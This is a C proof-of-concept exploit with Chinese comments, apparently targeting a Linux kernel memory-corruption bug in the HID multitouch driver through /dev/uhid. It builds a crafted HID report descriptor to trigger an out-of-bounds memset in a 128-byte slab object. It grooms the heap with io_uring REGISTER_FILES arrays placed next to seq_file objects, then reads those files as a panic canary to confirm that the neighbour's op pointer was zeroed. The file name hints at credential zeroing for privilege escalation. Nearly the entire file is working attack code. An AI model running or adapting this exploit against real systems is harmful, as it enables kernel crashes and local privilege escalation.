/* cred_zero2.c v3 — §DV: REGISTER_FILES 常驻整形 + seq_file canary
 *
 * 布局(kmalloc-128, 32 槽/页): 交替分配 [REG_FILES 数组(128B)][seq_file(120B)]
 *   ⇒ 每个数组的下一槽位恰是 seq_file
 * 触发: unregister 数组 → 槽位进 freelist(LIFO) → mt_get_feature kzalloc(128) 拿到它
 *   → memset(buf+121, 0, 128) ⇒ 零化自身尾 7B + 邻居 seq_file[0..119]
 *   ⇒ seq_file->op(@0x58)=NULL ⇒ 读该文件 = NULL->start ⇒ panic = memset 实锤!
 *
 * 账目(variant 'p'): report2 数据 120B ⇒ rsize=121 ⇒ kzalloc(128);
 *                    report3=248B ⇒ w24 = 248 - (121-1) = 128
 *
 * 用法: cred_zero2 [cycles] [p|w]
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <dirent.h>
#include <sys/select.h>
#include <linux/filter.h>
#include <linux/input.h>
#include <pthread.h>
#define EVIOCGMTSLOTS_L(len) _IOC(_IOC_READ, 'E', 0x0b, len)

#define EVSZ 4380

static unsigned char ev[EVSZ];
static void wr32(int o, uint32_t v){ memcpy(ev+o,&v,4); }
static void wr16(int o, uint16_t v){ memcpy(ev+o,&v,2); }
static uint32_t rd32(int o){ uint32_t v; memcpy(&v,ev+o,4); return v; }

/* WPTP 基底 + report2 膨胀(120B) + report3(248B) */
static const unsigned char wptp[] = {
0x05, 0x0D, 0x09, 0x05, 0xA1, 0x01,
    0x85, 0x01,
    0x09, 0x56, 0x24, 0x00, 0x26, 0xFF, 0xFF, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x54, 0x25, 0x05, 0x75, 0x08, 0x81, 0x02,
    0x05, 0x20, 0x0A, 0x94, 0x04, 0x15, 0x00, 0x26, 0xFF, 0x0F, 0x35, 0x00,
    0x46, 0xFF, 0x0F, 0x65, 0x12, 0x75, 0x0C, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x0D, 0x09, 0x22, 0xA1, 0x02,
        0x09, 0x51, 0x25, 0x0F, 0x75, 0x04, 0x95, 0x01, 0x81, 0x02,
        0x09, 0x42, 0x25, 0x01, 0x75, 0x01, 0x81, 0x02,
        0x09, 0x47, 0x81, 0x02,
        0x95, 0x05, 0x81, 0x03,
        0x05, 0x01, 0x09, 0x30, 0x15, 0x00, 0x26, 0xC8, 0x00, 0x35, 0x00,
        0x45, 0x69, 0x65, 0x11, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
        0x09, 0x31, 0x26, 0x96, 0x00, 0x45, 0x4B, 0x81, 0x02,
        0x05, 0x0D, 0x09, 0x30, 0x15, 0x00, 0x26, 0xFF, 0x0F, 0x35, 0x00,
        0x46, 0xFF, 0x0F, 0x65, 0x12, 0x75, 0x0C, 0x95, 0x01, 0x81, 0x02,
    0xC0,
    0x05, 0x09, 0x09, 0x01, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01,
    0x81, 0x02, 0x95, 0x07, 0x81, 0x03,
    0x85, 0x02,
    0x05, 0x0D, 0x09, 0x55, 0x25, 0x05, 0x75, 0x08, 0x95, 0x01, 0xB1, 0x02,
    0x09, 0x59, 0x25, 0x02, 0xB1, 0x02,
    /* [A] +118B const feature ⇒ report2 = 120B ⇒ rsize=121 ⇒ kzalloc(128) */
    /* [B] report3 = 248B const feature ⇒ w24 = 248 - 120 = 128 */
    0x85, 0x40,
    0x05, 0x0D, 0x09, 0xB0, 0x15, 0x01, 0x25, 0x03, 0x35, 0x6E, 0x45, 0xBE,
    0x65, 0x12, 0x75, 0x02, 0x95, 0x01, 0xB1, 0x02,
    0x85, 0x41,
    0x05, 0x0E, 0x09, 0x01, 0xA1, 0x02,
        0x09, 0x23, 0x15, 0x00, 0x25, 0x04, 0x75, 0x08, 0x95, 0x01, 0xB1, 0x02,
    0xC0,
0xC0,
};
static unsigned char desc[4096];
static unsigned desc_len;

static void build_desc(int stock){
    static const unsigned char pad118[] = { 0x75,0x08, 0x95,0x76, 0xB1,0x03 };
    static const unsigned char rep3[]  = { 0x85,0x03, 0x75,0x08, 0x95,0xF8, 0xB1,0x03 };
    /* 巨型 report3: 数据 4096B ⇒ w4=min(4096,limit)=4096 ⇒ w24=4096-120=3976 ⇒ 横跨 31 slot */
    static const unsigned char rep3huge[] = { 0x85,0x03, 0x75,0x08,
        0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
        0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
        0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
        0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
        0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
        0x95,0xFF, 0xB1,0x03, 0x95,0x10, 0xB1,0x03 };
    if (stock == 1){ memcpy(desc, wptp, sizeof(wptp)); desc_len = sizeof(wptp); return; }
    int pos = 0, i = 0, insA = -1;
    while (i < (int)sizeof(wptp) - 5){
        if (wptp[i]==0x09 && wptp[i+1]==0x59 && wptp[i+2]==0x25 && wptp[i+3]==0x02
            && wptp[i+4]==0xB1 && wptp[i+5]==0x02){ insA = i+6; break; }
        i++;
    }
    memcpy(desc+pos, wptp, insA);                    pos += insA;
    memcpy(desc+pos, pad118, sizeof(pad118));        pos += sizeof(pad118);
    memcpy(desc+pos, rep3,  sizeof(rep3));           pos += sizeof(rep3);
    if (stock == 2){ memcpy(desc+pos, rep3huge+8, sizeof(rep3huge)-8); pos += sizeof(rep3huge)-8; }
    memcpy(desc+pos, wptp+insA, sizeof(wptp)-insA);  pos += sizeof(wptp)-insA;
    desc_len = pos;
}

static int create_legacy(int fd, const char *name){
    memset(ev,0,EVSZ);
    wr32(0,0);
    strncpy((char*)(ev+4), name, 127);
    strncpy((char*)(ev+132), "virt-0", 63);
    uint64_t p = (uint64_t)(uintptr_t)desc;
    memcpy(ev+260,&p,8);
    wr16(268,(uint16_t)desc_len);
    wr16(270,0x0003);
    wr32(272,0x1234); wr32(276,0x5678); wr32(280,1);
    errno=0;
    ssize_t w = write(fd,ev,EVSZ);
    if (w<=0){ printf("CREATE 失败 ret=%zd errno=%d\n", w, errno); return -1; }
    return 0;
}
static int destroy_dev(int fd){
    memset(ev,0,EVSZ); wr32(0,1);
    return write(fd,ev,EVSZ) > 0 ? 0 : -1;
}

static long sys_setup(unsigned n, void*p){ return syscall(425,n,p); }
static long sys_reg(unsigned fd, unsigned op, void*a, unsigned n){ return syscall(427, fd, op, a, n); }

/* 扫描 /sys/class/input, 找我们设备(cz)的 event 节点并读 MT slot 数 */
static volatile int g_scan_stop = 0;
static int g_scan_fd = -1;
static int g_scan_slots = -1;
static char g_scan_name[128];
static pthread_t tid;
static int g_scan_started = 0;

static int g_base_count = -1;
static char g_base_names[24][64];
static int g_base_n = 0;

static void try_scan_once(void){
    DIR *di = opendir("/sys/class/input");
    if (!di) return;
    struct dirent *de;
    char cur[24][64]; int cn = 0;
    while ((de=readdir(di))!=NULL && cn<24){
        if (strncmp(de->d_name,"input",5)) continue;
        snprintf(cur[cn], sizeof cur[cn], "%s", de->d_name); cn++;
    }
    closedir(di);
    if (g_base_count < 0){ g_base_count = cn;
        for (int i=0;i<cn;i++) snprintf(g_base_names[i], 64, "%s", cur[i]);
        g_base_n = cn; return; }
    if (cn <= g_base_count){ g_base_count = cn; g_base_n = 0; return; }   /* 消失, 重置基线 */
    /* ★ 新设备出现: 立即找新增 inputN → eventN → EVIOCGMTSLOTS */
    for (int i=0;i<cn;i++){
        int known = 0;
        for (int j=0;j<g_base_n;j++) if (!strcmp(cur[i], g_base_names[j])) known = 1;
        if (known) continue;
        const char *num = cur[i]+5;
        char evp[64];
        snprintf(evp,sizeof evp,"/dev/input/event%s", num);
        int fd = open(evp,O_RDONLY);
        printf("  [oracle] 新 input=%s ev=%s fd=%d errno=%d\n", cur[i], evp, fd, errno);
        if (fd < 0) continue;
        int vals[256]; int q;
        for (q=0;q<256;q++) vals[q] = (int)0xDEADBEEF;
        struct { int value, min, max, fuzz, flat, res; } ai[64]; memset(ai,0,sizeof ai);
        int r = ioctl(fd, EVIOCGMTSLOTS_L(sizeof ai), ai);
        int *dw = (int*)vals;   /* 复用: 直接看 absinfo 数组区 */
        int cnt = 0;
        int *p2 = (int*)ai;
        for (q=0;q<(int)(sizeof ai/4);q++) if (p2[q] != 0) cnt++;
        int nz2 = 0; for (q=0;q<256;q++) if (vals[q] != (int)0xDEADBEEF) nz2++;
        printf("  [oracle] EVIOCGMTSLOTS ret=%d 非零absinfo-dword=%d vals非DEAD=%d vals[0..3]=%08x %08x %08x %08x\n",
               r, cnt, nz2, vals[0], vals[1], vals[2], vals[3]);
        close(fd);
        g_scan_stop = 1;
        return;
    }
    g_base_count = cn;
    for (int i=0;i<cn;i++) snprintf(g_base_names[i], 64, "%s", cur[i]);
    g_base_n = cn;
}

static void *scanner(void *arg){
    (void)arg;
    while (!g_scan_stop){
        try_scan_once();
    }
    return NULL;
}

static void scan_evslots(void){
    DIR *di = opendir("/sys/class/input");
    if (!di) return;
    struct dirent *de;
    while ((de=readdir(di))!=NULL){
        if (strncmp(de->d_name,"input",5)) continue;
        char p[512], b[128];
        snprintf(p,sizeof p,"/sys/class/input/%s/name",de->d_name);
        int f2=open(p,O_RDONLY);
        if (f2<0) continue;
        b[0]=0; ssize_t n2=read(f2,b,120); close(f2);
        if (n2<=0) continue; b[n2]=0;
        if (!strstr(b,"cz")) continue;                    /* 只看我们的设备 */
        /* inputN -> /dev/input/eventN */
        char evp[64];
        snprintf(evp,sizeof evp,"/dev/input/%s_event", de->d_name);  /* 不存在则试 eventN */
        int fd=open(evp,O_RDONLY);
        if (fd<0){
            const char *num = de->d_name+5;
            snprintf(evp,sizeof evp,"/dev/input/event%s", num);
            fd=open(evp,O_RDONLY);
        }
        if (fd<0){ printf("  %s(%s): event 节点打不开\n", de->d_name, b); continue; }
        struct input_absinfo ai[70];
        memset(ai,0,sizeof ai);
        errno=0;
        int r=ioctl(fd, EVIOCGMTSLOTS_L(sizeof ai), ai);
        printf("  %s(%s): EVIOCGMTSLOTS ret=%d slots=%d errno=%d\n",
               de->d_name, b, r, r>=0?ai[0].value:-1, errno);
        close(fd);
    }
    closedir(di);
}

static void dump_hid(void){
    DIR *d = opendir("/sys/bus/hid/devices");
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL){
        if (de->d_name[0]=='.') continue;
        char p[512], link[512];
        snprintf(p,sizeof p,"/sys/bus/hid/devices/%s/driver", de->d_name);
        ssize_t n = readlink(p, link, sizeof link - 1);
        if (n<0) n=0; link[n]=0;
        const char *drv = strrchr(link,'/');
        printf("  hid: %s -> %s\n", de->d_name, n>0 ? drv+1 : "(未绑定)");
    }
    closedir(d);
}

int main(int argc, char **argv){
    setvbuf(stdout,NULL,_IONBF,0);
    int n_cycles = argc>1 ? atoi(argv[1]) : 24;
    int stock    = argc>2 && argv[2][0]=='w';
    if (argc>2 && argv[2][0]=='h') stock = 2;
    int parse_canary = argc>2 && argv[2][0]=='c';
    unsigned can_cm  = argc>3 ? (unsigned)strtoul(argv[3],0,0) : 0xFF;
    build_desc(stock);
    printf("=== cred_zero2 v3: %d cycles desc=%u B ===\n", n_cycles, desc_len);

    int keep = open("/dev/zero", O_RDONLY);
    int nr16 = 16;                       /* kvmalloc(16*8)=128B → kmalloc-128 */
#define R 40
    int ufds[R], seqfds[R];
    int regfds[16];
    int n=0;

    /* ---- 交替整形: [REG_FILES 数组][seq_file] 同页交替 ---- */
    for (int i=0;i<R;i++){
        struct { uint64_t x[30]; } p; memset(&p,0,sizeof p);
        long u = sys_setup(4, &p);
        if (u < 0){ printf("uring_setup 失败\n"); break; }
        for (int j=0;j<nr16;j++) regfds[j] = dup(keep);
        if (sys_reg((unsigned)u, 2, regfds, nr16) != 0){ printf("REGISTER_FILES 失败\n"); break; }
        ufds[n] = (int)u;
        seqfds[n] = open("/proc/self/stat", O_RDONLY);
        n++;
    }
    /* 预读一遍, 让 seq_file->buf 分配(page-size, 与 128 无关) */
    for (int i=0;i<n;i++){ char tb[16]; pread(seqfds[i], tb, 8, 0); }
    printf("整形完成: %d 组 [数组+seq] 交替\n", n);

    /* ---- 触发循环 ---- */
    int ufd = open("/dev/uhid", O_RDWR|O_CLOEXEC);
    if (ufd<0){ printf("open uhid 失败 errno=%d\n", errno); return 1; }
    int hits=0;
    for (int c=0;c<n_cycles && c*3<n;c++){
        /* 1) 每轮释放 3 个数组: 第1个预期被 probe 内部分配抢占,
              第2个留给 mt_get_feature 的 kzalloc(128) ⇒ 其下一槽位 = seq_file */
        for (int k=0;k<3;k++){
            int idx = c*3 + k;
            if (idx >= n) break;
            if (ufds[idx] >= 0){
                if (sys_reg((unsigned)ufds[idx], 3, NULL, 0) != 0)
                    printf("[%d] UNREGISTER(%d) 失败 errno=%d\n", c, idx, errno);
                ufds[idx] = -1;
            }
        }
        /* 2) CREATE → 应答 GET_REPORT(rnum=2) data[0]=3 → memset 零化邻居 */
        int got=0;
        if (parse_canary && !g_scan_started){ g_scan_started=1; pthread_create(&tid, NULL, scanner, NULL); }
        if (create_legacy(ufd,"cz")<0) break;
        for (int t=0;t<8;t++){
            struct timeval tv={0,250000};
            fd_set rf; FD_ZERO(&rf); FD_SET(ufd,&rf);
            if (select(ufd+1,&rf,NULL,NULL,&tv)<=0) continue;
            ssize_t r = read(ufd,ev,EVSZ);
            if (r<=0) continue;
            uint32_t type = rd32(0);
            if (type==9 || type==13){
                uint8_t rnum = ev[8];
                int oob = (rnum==2);
                memset(ev,0,EVSZ);
                /* ★ 应答类型 = 事件类型 + 1: GET_REPORT(9)→10, SET_REPORT(13)→14 */
                wr32(0, type==9 ? 10 : 14); wr32(4,rd32(4)); wr16(8,0);
                wr16(10, 128);
                if (parse_canary){ ev[12]=2; ev[13]=can_cm; }   /* data[0]=2 ⇒ 解析 report2 ⇒ ContactMax=can_cm */
                else            { ev[12]=oob?3:0; }
                ssize_t w = write(ufd,ev,EVSZ);
                printf("  ANSWER(rnum=%u oob=%d) ret=%zd\n", rnum, oob, w);
                if (oob) got=1;
                if (parse_canary && oob){
                    usleep(2000000);
                    if (g_scan_fd>=0)
                        printf("  ★解析实锤: name=%s slots=%d (期望 %u)\n", g_scan_name, g_scan_slots, can_cm);
                    else
                        printf("  扫描线程未捕获 input 设备\n");
                    DIR *di = opendir("/sys/class/input");
                    if (di){ struct dirent *de;
                        while ((de=readdir(di))!=NULL){
                            if (strncmp(de->d_name,"input",5)) continue;
                            char p[512], b[128]; ssize_t n2;
                            snprintf(p,sizeof p,"/sys/class/input/%s/name",de->d_name);
                            int f2=open(p,O_RDONLY);
                            if (f2>=0){ b[0]=0; n2=read(f2,b,120); if(n2>0){b[n2]=0; printf("  %s: %s\n",de->d_name,b);} close(f2); }
                        } closedir(di); }
                }
            }
        }
        usleep(2000000);   /* 等 probe 完整跑完 */
        if (c==0) dump_hid();
        destroy_dev(ufd);
        usleep(30000);
        if (!got) printf("[%d] 无 GET_REPORT\n", c);
        printf("[%d/%d] got=%d\n", c+1, n_cycles, got);
    }

    /* ---- 终极 canary: 逐个读 seq 文件; op 被零化 ⇒ panic ---- */
    printf("读取 seq 文件验证(op 应为 NULL 的那些)...\n");
    for (int i=0;i<n;i++){
        if (seqfds[i] < 0) continue;
        char tb[32];
        pread(seqfds[i], tb, 16, 0);
    }
    printf("全部读完无 panic(或上面已 panic)\n");
    printf("=== 结束: hits=%d ===\n", hits);
    return hits>0?0:2;
}
